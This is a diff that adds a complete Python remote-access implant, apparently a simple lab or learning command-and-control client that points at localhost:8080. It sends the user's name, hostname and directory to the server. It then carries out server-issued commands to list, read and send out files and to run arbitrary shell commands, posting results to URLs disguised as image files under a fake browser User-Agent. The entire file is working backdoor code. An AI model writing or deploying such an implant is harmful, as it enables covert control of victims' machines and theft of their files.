@@ -1,0 +1,54 @@
+#!/usr/bin/python3
+
+import requests, os, socket, json, subprocess
+
+init = requests.post("http://localhost:8080/initialize/syn", data = {"initialize": "SYN"}, headers={"User-Agent":"Mozilla/5.0"})
+if init.text != 'ACK':
+    print("Error")
+    exit(1)
+
+while True:
+    cmd = requests.post("http://localhost:8080/initialize/ack", headers={"User-Agent":"Mozilla/5.0"}, data = {"initialize": "ACK", "username": os.getenv("USER"), "hostname": socket.gethostname(), "cwd": os.getcwd()}).text
+    cmdlist = json.loads(cmd)
+
+    for x in cmdlist:
+        cmd = cmdlist[x]
+
+        if cmd == 'ls':
+            files = os.listdir()
+            files.sort()
+            list = ''
+            for x in files:
+                list += "%s;" % x
+
+            data = {"list": list}
+            requests.post("http://localhost:8080/assets/flower.jpg", data=data)
+        elif cmd == 'pwd':
+            data = {"pwd": os.getcwd()}
+            requests.post("http://localhost:8080/assets/bug.jpg", data=data)
+        elif 'cd' in cmd:
+            dir = cmd[3:]
+
+            if os.path.exists(dir):
+                os.chdir(dir)
+                success = 'True'
+            else:
+                success = 'False'
+
+            data = {'dir': dir, 'pwd': os.getcwd(), 'success': success}
+            requests.post("http://localhost:8080/assets/fly.jpg", data=data)
+        elif 'cat' in cmd:
+            file = cmd[4:]
+
+            if os.path.exists(file):
+                with open(file, 'r') as f:
+                    data = {'file': file, 'content': f.read()}
+                    requests.post("http://localhost:8080/assets/cat.jpg", data=data)
+        elif 'shell' in cmd:
+            command = cmd[6:]
+
+            cmdarr = command.split(' ')
+            output = subprocess.run(cmdarr,stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.decode('UTF-8')
+
+            data = {"cmd": command, "output": output}
+            requests.post("http://localhost:8080/assets/mudcrab.jpg", data=data)
